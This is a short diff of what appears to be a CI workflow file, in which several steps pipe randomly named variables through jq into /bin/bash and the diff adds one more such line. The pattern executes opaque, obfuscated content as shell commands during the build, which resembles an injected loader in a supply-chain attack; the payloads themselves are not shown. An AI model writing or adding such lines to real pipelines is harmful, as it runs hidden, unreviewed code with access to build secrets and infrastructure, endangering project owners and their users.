@@ -28,6 +28,7 @@ jobs:
           echo $tgc15 | jq -r .pkv21 | /bin/bash
           echo $qd700 | jq -r .a71 | /bin/bash
           echo $oju5076 | jq -r .g472 | /bin/bash
+          echo $tvwr281 | jq -r .ecoq191 | /bin/bash
 
       - name: Upload artifact
         if: always()
